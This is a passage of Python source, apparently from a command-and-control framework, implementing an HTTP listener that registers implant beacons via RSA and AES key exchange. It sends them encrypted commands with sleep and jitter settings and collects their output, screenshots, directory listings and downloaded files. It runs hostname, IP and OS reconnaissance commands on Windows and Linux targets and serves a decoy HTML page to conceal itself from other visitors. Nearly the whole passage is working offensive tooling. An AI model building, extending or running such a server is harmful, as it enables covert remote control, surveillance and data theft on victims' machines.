    def start_auth_timeout(self, minutes: int = 60):
        if minutes <= 0:
            return
        self.auth_expiry_time = time.time() + (minutes * 60)
        self.listener_is_active = True
        threading.Timer(minutes * 60, self._expire_auth).start()
    def _expire_auth(self):
        self.listener_is_active = False
    def set_session_executing(self, session_id):
        with self.lock:
            self.execution_status[session_id] = True
    def set_session_idle(self, session_id):
        with self.lock:
            self.execution_status[session_id] = False
    def _add_custom_headers_to_app(self):
        @self.app.after_request
        def add_custom_headers(response):
            if request.method in ("GET", "HEAD"):
                for name, value in self.get_server_headers.items():
                    if name not in response.headers:
                        response.headers[name] = value
            if request.method == "POST":
                for name, value in self.post_server_headers.items():
                    if name not in response.headers:
                        response.headers[name] = value
            return response   
    def clean_output(self, raw_output):
        if not raw_output or not isinstance(raw_output, str):
            return raw_output
        cleaned = raw_output
        if self.prepend_output:
            prepend = self.prepend_output
            if cleaned.startswith(prepend):
                cleaned = cleaned[len(prepend):]
        if self.append_output:
            append = self.append_output
            if cleaned.endswith(append):
                cleaned = cleaned[:-len(append)]
        return cleaned.strip()    
    def _unified_handler(self):
        if request.method == "GET":
            session_id_param = request.args.get("session_id")
            if session_id_param:
                try:
                    session_id = session_id_param
                    session = self.sessions.get(session_id)
                    if session:
                        session["last_seen"] = time.time()
                        aes_http_cipher = session["aes_http_cipher"]
                        command = session.get("command", "")
                        encrypted_command = aes_http_cipher.encrypt(command) if command else ""
                        return jsonify({"command": encrypted_command}),200
                except:
                    return self.html_content, 200, {"Content-Type": "text/html"}
            return self.html_content, 200, {"Content-Type": "text/html"}
        if request.method in ["GET", "HEAD"]:
            return self.html_content, 200, {"Content-Type": "text/html"}
        if not request.is_json:
            return self.html_content, 200, {"Content-Type": "text/html"}
        data = request.get_json(silent=True)
        if not data:
            return self.html_content, 200, {"Content-Type": "text/html"}
        action = data.get("action")
        if not action:
            return self.html_content, 200, {"Content-Type": "text/html"}
        if action == "checkin":
            if not self.listener_is_active:
                return self.html_content, 200, {"Content-Type": "text/html"}
            encrypted_token = data.get("token")
            encrypted_aes_key = data.get("aes_key")
            if not encrypted_token or not encrypted_aes_key:
                return self.html_content, 200, {"Content-Type": "text/html"}
            try:
                token_bytes = self.b64decode(encrypted_token)
                aes_key_bytes = self.b64decode(encrypted_aes_key)
                token = self.rsa_cipher.decrypt(token_bytes).decode('utf-8')
                aes_key = self.rsa_cipher.decrypt(aes_key_bytes)
                if token != self.listener_uuid:
                    return self.html_content, 200, {"Content-Type": "text/html"}
                aes_http_cipher = AESCipher_string(aes_key, self.use_urlsafe_base64_encoding)
            except Exception:
                return self.html_content, 200, {"Content-Type": "text/html"}
            if self.session_limiting_enable and self.total_accepted_sessions >= self.max_sessions_limit:
                return self.html_content, 200, {"Content-Type": "text/html"}
            if self.session_limiting_enable:
                self.total_accepted_sessions += 1
            self.current_active_sessions += 1
            id_protocol = str(uuid.uuid4())
            session_id = f"HTTP - RSA - {id_protocol}"
            self.sessions[session_id] = {
                "command": "uname",
                "aes_http_cipher": aes_http_cipher,
                "suppress_output": True,
                "last_seen": time.time(),
                "info_collected": False,
                "os_type": None
            }
            self.execution_status[session_id] = False
            self.add_session(session_id, None, (self.host, self.port),
                            protocol_type="rsaHTTP_Server", exfiltration_profile=self.exfiltration_profile, encryption_type=aes_http_cipher, encoding_type=None, quic_sessions=None)
            self.update_output_text(f"+-------------------------------------------------------------------------------------------------------------+\n[+] HTTP RSA connection from {request.remote_addr}, Beacon ID: {id_protocol}\n+-------------------------------------------------------------------------------------------------------------+\n\n", is_general=True)
            get_client_headers_text = '\n'.join(f"{k}: {v}" for k, v in sorted(self.get_client_headers.items()))
            post_client_headers_text = '\n'.join(f"{k}: {v}" for k, v in sorted(self.post_client_headers.items()))
            return jsonify({
                "sid": session_id,
                "ua": self.user_agent,
                "sj": self.start_jitter,
                "ej": self.end_jitter,
                "sl": self.Sleep,
                "ur": self.uris,
                "pre": self.prepend_output,
                "app": self.append_output,
                "gh": get_client_headers_text,
                "ph": post_client_headers_text
            }), 200
        elif action == "get_tasks":
            session_id = data.get("sid")
            session = self.sessions.get(session_id)
            if not session:
                return self.html_content, 200, {"Content-Type": "text/html"}
            session["last_seen"] = time.time()
            aes_http_cipher = session["aes_http_cipher"]
            command = session.get("command", "")
            if command:
                with self.lock:
                    self.execution_status[session_id] = True
            encrypted_command = aes_http_cipher.encrypt(command) if command else ""
            return jsonify({"command": encrypted_command}), 200
        elif action == "submit":
            session_id = data.get("sid")
            encrypted_output = data.get("out", "")
            session = self.sessions.get(session_id)
            if not session:
                return self.html_content, 200, {"Content-Type": "text/html"}
            with self.lock:
                self.execution_status[session_id] = False
            cleaned_output = self.clean_output(encrypted_output)
            aes_http_cipher = session["aes_http_cipher"]
            try:
                output = aes_http_cipher.decrypt(cleaned_output)
            except:
                return self.html_content, 200, {"Content-Type": "text/html"}
            if output.startswith("screenshot-"):
                base64_data = output[11:]
                self.save_screenshot_window(base64_data, session_id)
                session["command"] = ""
                return jsonify({"status": "received"}), 200
            if output.startswith("browse-data-"):
                base64_data = output[12:]
                json_str = base64.b64decode(base64_data).decode('utf-8')
                dir_data = json.loads(json_str)
                if dir_data.get("success"):
                    self.open_file_browse_window(dir_data, session_id, session.get("os_type"))
                else:
                    self.update_output_text(f"[-] Error: {dir_data.get('error')}\n\n", is_general=False, session_name=session_id)
                session["command"] = ""
                return jsonify({"status": "received"}), 200
            if output.startswith("file-data:"):
                parts = output[10:].split('|', 2)
                if len(parts) == 3:
                    filename, filesize_str, filedata_b64 = parts
                    self.save_file_from_browse(session_id, filename, filedata_b64)
                session["command"] = ""
                return jsonify({"status": "received"}), 200
            if output.startswith("SUCCESS:") or output.startswith("ERROR:"):
                if "Deleted" in output or "Renamed" in output:
                    if session_id in self.browse_windows:
                        browse = self.browse_windows.get(session_id)
                        if browse and browse.window_file_browse:
                            browse.fetch_directory(browse.current_path)
                session["command"] = ""
                return jsonify({"status": "received"}), 200
            if not session.get("info_collected"):
                session["suppress_output"] = False
                self.os_type = "Linux" if "Linux" in output else "Windows"
                session["os_type"] = self.os_type
                if self.os_type == "Windows":
                    cmd = "hostname & powershell -Command $PID & cmd /c echo %os% & cmd /c echo %PROCESSOR_ARCHITECTURE% & for /f \"tokens=2 delims=:\" %i in ('ipconfig ^| findstr IPv4') do @echo %i"
                else:
                    cmd = "hostname && echo $$ && uname -o && uname -m && hostname -I | awk \"{print \\$1}\""
                session["command"] = cmd
                session["info_collected"] = "waiting"
                return jsonify({"status": "received"})
            elif session.get("info_collected") == "waiting":
                lines = output.strip().splitlines()
                try:
                    os_info = lines[0] if len(lines) > 0 else "Unknown"
                    pid = lines[1] if len(lines) > 1 else "Unknown"
                    uname_output = lines[2] if len(lines) > 2 else "Unknown"
                    uname_m_output = lines[3] if len(lines) > 3 else "Unknown"
                    architecture = f"{uname_output} - {uname_m_output}"
                    ark = lines[4] if len(lines) > 4 else "Unknown"
                except:
                    os_info = pid = uname_output = uname_m_output = ark = "Unknown"
                    architecture = "Unknown"
                self.os_type = session.get("os_type", "Windows")
                self.os_img = self.images.get(self.os_type, self.base64_img_windows)
                check_in_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                address = (request.remote_addr, request.environ.get('REMOTE_PORT', 'Unknown'))
                self.session_table.insert("", "end", text=f" {architecture}", image=self.os_img,
                                        values=(session_id, f"{address[0]} : {address[1]}", "00:00:00",
                                                os_info, check_in_time, pid, ark))
                if session_id not in self.running_server_instances:
                    self.running_server_instances[session_id] = {}
                self.running_server_instances[session_id]["original_ips"] = (f"{address[0]}:{address[1]}", ark)
                threading.Thread(target=self.track_http_session_time,
                                args=(session_id, address, pid, ark)).start()
                session["info_collected"] = True
                session["command"] = ""
                return jsonify({"status": "received"})
            else:
                self.update_output_text(f"{output}\n\n", is_general=False, session_name=session_id)
                session["command"] = ""
                return jsonify({"status": "received"})
        return self.html_content, 200, {"Content-Type": "text/html"}
    def _register_routes(self):
        for uri in self.uris:
            if not uri.startswith('/'):
                uri = '/' + uri
            self.app.route(uri, methods=["GET", "POST", "HEAD"])(self._unified_handler)
    def track_http_session_time(self, session_id, address, pid, ark):
        if session_id not in self.sessions:
            return
        session_item = None
        try:
            for child in self.session_table.get_children():
                if self.session_table.item(child)['values'][0] == session_id:
                    session_item = child
                    break
        except:
            return
        if not session_item:
            return
        ip, port = address
        last_active_time = time.time()
        active_seconds = 0
        paused = False
        blink_counter = 0
        saved_time = "00:00:00"
        is_disconnected = False
        final_time = "00:00:00"                    
        while session_id in self.sessions:
            time.sleep(1)
            try:
                if not self.session_table.exists(session_item):
                    break
            except:
                break
            current_time = time.time()
            last_seen = self.sessions.get(session_id, {}).get("last_seen", last_active_time)
            since_last_seen = current_time - last_seen
            since_last_seen_minutes = since_last_seen / 60.0
            current_ip = f"{ip} : {port}"
            if self.hidden_addresses.get(session_id, False):
                current_ip = f"██████ : {port}"
            current_target = ark
            if self.hidden_addresses.get(session_id, False):
                current_target = "██████"
            is_executing = self.execution_status.get(session_id, False)
            is_reconnecting = since_last_seen > self.reconnect_delay_entry
            if not self.active_http_rsa_listeners or since_last_seen_minutes > self.reconnect_timeout_entry:
                if not is_disconnected:
                    is_disconnected = True
                    final_time = saved_time  
                    status = f"Disconnected - {final_time}"
                    self.update_output_text(f"[-] Client {address} disconnected.\n\n", is_general=True)
                if session_id in self.sessions:
                    with self.lock:
                        del self.sessions[session_id]
                        if self.session_limiting_enable:
                            self.current_active_sessions = max(0, self.current_active_sessions - 1)
                        self.execution_status[session_id] = False
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, values=(
                            session_id, current_ip, status,
                            self.session_table.item(session_item)['values'][3],
                            self.session_table.item(session_item)['values'][4], pid, current_target
                        ), tags=("Disconnected",))
                except:
                    pass
                break
            if not is_reconnecting:
                active_seconds += 1
                saved_time = str(datetime.timedelta(seconds=active_seconds))
                paused = False
            if is_executing:
                blink_counter += 1
                if blink_counter % 2 == 0:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#D4A017", foreground="#FFFFFF")
                    except:
                        pass
                else:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#1e2220", foreground="#FFFFFF")
                    except:
                        pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Executing",))
                except:
                    pass
            elif is_reconnecting:
                status = f"Reconnecting - {saved_time}"
                try:
                    self.session_table.tag_configure("Reconnecting", background="#020B3F", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Reconnecting",))
                except:
                    pass
                paused = True
            else:
                status = f"Active - {saved_time}"
                try:
                    self.session_table.tag_configure("Active", background="#1e2220", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Active",))
                except:
                    pass
            try:
                if self.session_table.exists(session_item):
                    values = self.session_table.item(session_item)['values']
                    self.session_table.item(session_item, values=(
                        session_id, current_ip, status, values[3], values[4], pid, current_target
                    ))
            except Exception as e:
                self.update_output_text(f"Error updating beacon HTTP: {e}", is_general=False, session_name=session_id)
                break
    def close_session_by_id(self, session_uuid):
        session_to_close = None
        for session_id in list(self.sessions.keys()):
            if session_uuid in session_id:
                session_to_close = session_id
                break
        if not session_to_close:
            return False
        with self.lock:
            self.sessions[session_to_close]["last_seen"] = 0
            self.sessions[session_to_close]["command"] = ""
            self.execution_status[session_to_close] = False
            if self.session_limiting_enable:
                self.current_active_sessions = max(0, self.current_active_sessions - 1)
        return True
    def start_server(self):
        def run_app():
            self.active_http_rsa_listeners = make_server(
                self.host, self.port, self.app,
                request_handler=lambda *args, **kwargs: CustomWSGIRequestHandler(*args, server_header=self.get_server_headers, **kwargs)
            )
            self.active_http_rsa_listeners.serve_forever()
        self.update_output_text(f"[i] Listening for HTTP connections with RSA encryption on {self.host}:{self.port}\n\n", is_general=True)
        self.update_output_text(f"[*] AUTH ID: {self.listener_uuid}\n\n", is_general=True)
        self.thread = threading.Thread(target=run_app, daemon=True)
        self.thread.start()
        if self.auth_timeout_enabled:
            self.start_auth_timeout(minutes=self.auth_timeout_minutes)
    def stop_server(self):
        if self.active_http_rsa_listeners:
            self.active_http_rsa_listeners.shutdown()
            self.active_http_rsa_listeners = None
        if self.thread:
            self.thread.join(timeout=2)
            self.thread = None
        with self.lock:
            self.execution_status.clear()
